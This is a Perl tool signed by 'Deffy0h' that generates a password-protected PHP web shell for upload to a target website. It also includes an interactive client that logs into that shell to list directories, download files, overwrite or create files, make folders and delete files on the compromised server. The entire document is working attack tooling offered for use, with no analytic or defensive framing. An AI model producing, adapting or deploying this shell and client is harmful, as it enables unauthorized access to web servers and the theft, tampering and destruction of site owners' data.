#Skype: Deffy0h

use HTTP::Request;
use LWP::UserAgent;
use Getopt::Long;
use Digest::MD5 qw(md5_hex);

$deffy0h="Deffy0h";
$code="deffy0h";
my $OK_HTTP=200;
my $RE_ERRO="ERRO0";

print <<Eop;




		88d888b. 88d8b.d8b. dP    dP .d8888b.
		88'  `88 88'`88'`88 88    88 88'  `""
		88    88 88  88  88 88.  .88 88.  ...
		dP    dP dP  dP  dP `88888P' `88888P'
		
		
		-===================================-
		\t  Create By $deffy0h
		-===================================-

		
		
		use: nmuc.pl -op 'CONN' -connect to shell
		use: nmuc.pl -op 'CREN' -generate shell
		
Eop

my $u="";
my $p="";
my $op="";
my $auth="";
my $path="";
my $lastFolder="";
my $lj="";
my $hem="";

GetOptions("opt=s"=>\$op);

unless($op){
print "\n[-] OPTION\n\n";
exit;
}

if($op eq "CONN"){
CONN();
}
if($op eq "CREN"){
CREN();
}

sub CREN(){
my $file="Shell.php";
print "FILE: ";
$file=<STDIN>;
chomp($file);
if($file!~m/.php$/){
$file="Shell.php";
}

print "PASSWORD: ";
$p=<STDIN>;
chomp($p);
unless($p){
print "[-] PASSWORD=''\n";
exit;
}

$p=md5_hex($p);

print "[+] FILE=> $file\n";
print "[+] PASSWORD=> $p\n";

my $ex_password=chr(36)."password";
my $ex_code=chr(36)."code";
my $ex_GET=chr(36)."_GET";
my $ex_p=chr(36)."p";
my $ex_code_=chr(36)."code_";
my $ex_type=chr(36)."type";
my $ex_path=chr(36)."path";
my $ex_text=chr(36)."text";
my $ex_f=chr(36)."f";
my $ex_r=chr(36)."r";
my $ex_dir=chr(36)."dir";

my $er_e=chr(91);
my $er_ee=chr(93);

$mmh="
<?php 

#-=================================================-
#		   Create By Deffy0h/nmuc.pl					
#-=================================================-

$ex_password='$p';
$ex_code='$code';

if(!isset($ex_GET $er_e 'p' $er_ee )){exit;}$ex_p=$ex_GET $er_e 'p' $er_ee ;
if(!isset($ex_GET $er_e 'code' $er_ee )){exit;}$ex_code_=$ex_GET $er_e 'code' $er_ee ;
if($ex_code_!=$ex_code){exit;}
if($ex_password!=$ex_p){echo 'ERRO0'; exit;}

if(isset($ex_GET $er_e 'type' $er_ee )){$ex_type=$ex_GET $er_e 'type' $er_ee ;}else{exit;}
if($ex_type=='dir'){
DIR_();
}
if($ex_type=='open'){
OPEN_();
}
if($ex_type=='mkdir'){
MKDIR_();
}
if($ex_type=='del'){
DEL_();
}
if($ex_type=='edit'){
EDIT_();
}

function EDIT_(){
if(!isset($ex_GET $er_e 'path' $er_ee )){exit;}$ex_path=$ex_GET $er_e 'path' $er_ee ;
if(!isset($ex_GET $er_e 'text' $er_ee )){exit;}$ex_text=$ex_GET $er_e 'text' $er_ee ;
$ex_f=fopen($ex_path,'w') or die('e1');
fwrite($ex_f,$ex_text);
fclose($ex_f);
}

function DEL_(){
if(!isset($ex_GET $er_e 'path' $er_ee )){exit;}$ex_path=$ex_GET $er_e 'path' $er_ee ;
if(!is_dir($ex_path)){
unlink($ex_path);
exit;
}
rmdir($ex_path);
}

function MKDIR_(){
if(!isset($ex_GET $er_e 'path' $er_ee )){exit;}$ex_path=$ex_GET $er_e 'path' $er_ee ;
mkdir($ex_path,773,true);
}

function OPEN_(){
if(!isset($ex_GET $er_e 'path' $er_ee )){exit;}$ex_path=$ex_GET $er_e 'path' $er_ee ;
$ex_f=fopen($ex_path,'r') or die('e1');
$ex_r=fread($ex_f,filesize($ex_path));
fclose($ex_f);
echo $ex_r;
}

function DIR_(){
if(!isset($ex_GET $er_e 'path' $er_ee )){exit;}$ex_path=$ex_GET $er_e 'path' $er_ee ;
$ex_dir=scandir($ex_path);
print_r($ex_dir);
}

?>
";

open($a,">",$file);
$a->print($mmh);
$a->close();

print "[+] FILE $file SAVED\n\n";

}

sub CONN(){
print "URL: target.com/upload/file/shell.php\n";
print "URL: ";
$u=<STDIN>;
chomp($u);
unless($u){
print "\n[-] NOT DEFINED URL\n";
exit;
}

if($u!~m/http:/){
$u="http://".$u;
}

$ua = LWP::UserAgent->new;
if($re=HTTP::Request->new(GET=>$u)){
$response=$ua->request($re);
if($response->status_line!=$OK_HTTP){
print "\n[-] ERRO\n";
exit;
}
}

print "PASSWORD: ";
$p=<STDIN>;
chomp($p);
unless($p){
print "\n[-] NOT DEFINED PASSWORD\n";
exit;
}

$p=md5_hex($p);

print "\n\n";
print "[+] URL=> $u\n";
print "[+] PASSWORD=> $p\n";

if($u!~m/[?]/){
$u=$u."?";
}

my $ioe="code=".$code."&p=".$p;
$auth=$u.$ioe;

print "[+] AUTHENTICATING...\n";

if($re=HTTP::Request->new(GET=>$auth)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
$htm=$response->decoded_content;
if($htm!~m/$RE_ERRO/){
print "[+] OK WELCOME\n";
}else{
print "[-] INCORRECT PASSWORD\n";
exit;
}
}else{
print "\n[-] ERRO\n";
exit;
}
}

COMMAND();
}

sub RETN(){
COMMAND();
}

sub COMMAND(){
print "COMMAND: ";
my $command=<STDIN>;
chomp($command); 

if($command eq "dir"){
FILES_SERVER();
}
if($command eq "cls"){
CLS();
}
if($command eq "exit"){
EX();
}
if($command eq "open"){
OPEN_FILES();
}
if($command eq "mkdir"){
CREATE_FOLDER();
}
if($command eq "del"){
DEL_();
}
if($command eq "edit"){
EDIT_();
}
if($command eq "create"){
EDIT_();
}
if($command ne "dir" || $command ne "cls" || $command ne "exit" || $command ne "open" || $command ne "mkdir" || $command ne "del" || $command ne "edit"){RETN();}

}

sub EDIT_(){

print "PATH=> ";
$path=<STDIN>;
chomp($path);

print "TEXT=> ";
$hem=<STDIN>;
chomp($hem);

$gh=$auth."&type=edit&path=".$path."&text=".$hem;

print $gh."\n";
print $hem;

if($re=HTTP::Request->new(GET=>$gh)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
$htm=$response->decoded_content;
if($htm eq ""){
print "\n\n[+] $path EDITED WITH SUCCESS\n\n";
}
}
}

}

sub DEL_(){

print "PATH=> ";
$path=<STDIN>;
chomp($path);

$delmk=$auth."&type=del&path=".$path;

if($re=HTTP::Request->new(GET=>$delmk)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
$htm=$response->decoded_content;
if($htm!~m/$RE_ERRO/){
print "\n";


print "\n[+] $path DELETED\n";


}else{
print "[-] INCORRECT PASSWORD\n";
exit;
}
}else{
print "\n[-] ERRO\n";
exit;
}
}
print "\n\n";
RETN();
}

sub FILES_SERVER(){

print "PATH=> ";
$path=<STDIN>;
chomp($path);

if($path!~m/./){
$path="/".$path."/";
}

$u_files=$auth."&type=dir"."&path=".$path;
if($re=HTTP::Request->new(GET=>$u_files)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
$htm=$response->decoded_content;
if($htm!~m/$RE_ERRO/){
if($htm=~/Array/){
print "\n";

$lastFolder=$lastFolder."/".$path;
$lj=$path;

print "[+] PATH=> ".$lastFolder."\n\n";
print $htm;
}else{
print "USE: /folder/ or '/' or '../folder/' or '.'\n";
}
}else{
print "[-] INCORRECT PASSWORD\n";
exit;
}
}else{
print "\n[-] ERRO\n";
exit;
}
}
print "\n\n";
RETN();
}

sub OPEN_FILES(){

print "FILE=> ";
$path=<STDIN>;
chomp($path);

print "SAVE=> ";
my $save="";
$save=<STDIN>;
chomp($save);
unless($save){
$save="index.php";
}

$uu_files=$auth."&type=open&path=".$path;
chomp($u_files);

if($re=HTTP::Request->new(GET=>$uu_files)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
$htm=$response->decoded_content;
if($htm!~m/$RE_ERRO/){
print "\n";

if($htm!~m/EEE_FD/){

open($a,">",$save);
$a->print($htm);
$a->close();

print "\n[+] FILE $save SAVE\n";

}else{
print "\n[-] FILE NOT EXISTS\n";
}

}else{
print "[-] INCORRECT PASSWORD\n";
exit;
}
}else{
print "\n[-] ERRO\n";
exit;
}
}
print "\n\n";
RETN();
}

sub CREATE_FOLDER(){

print "PATH=> ";
$path=<STDIN>;
chomp($path);

print "FOLDER=> ";
my $folder="";
$folder=<STDIN>;
chomp($folder);

$uumk_=$auth."&type=mkdir&path=".$path."/".$folder;

if($re=HTTP::Request->new(GET=>$uumk_)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
$htm=$response->decoded_content;
if($htm!~m/$RE_ERRO/){
print "\n";


print "\n[+] FOLDER $folder CREATED\n";


}else{
print "[-] INCORRECT PASSWORD\n";
exit;
}
}else{
print "\n[-] ERRO\n";
exit;
}
}
print "\n\n";
RETN();
}

sub CLS(){
system("cls");
RETN();
}

sub EX(){exit;}

__END__

Deffy0h   Channel Youtube
https://www.youtube.com/channel/UC9kMfNPD3dgMO94JeFdTVBA
http://deffy0h.tk

BANNER:
http://www.kammerl.de/ascii/AsciiSignature.php
